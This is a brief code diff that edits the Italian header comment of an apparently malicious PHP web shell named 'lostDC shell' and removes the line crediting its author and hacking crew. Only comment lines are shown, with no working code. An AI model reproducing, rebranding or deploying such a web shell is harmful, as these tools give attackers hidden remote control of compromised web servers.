@@ -3,7 +3,7 @@
 /* *
  * 
  * lostDC shell
- * PHP Shell scritta da lostpassword, D3vilc0de crew
+ * PHP Shell scritta 
  * Rilasciata sotto licenza GPL 2009/2010
  * Data rilascio: 25/12/2009 (eh si, il giorno di natale non avevo niente da fare)
  * La Shell presenta varie funzioni, ma rimane comunque in continuo aggiornamento
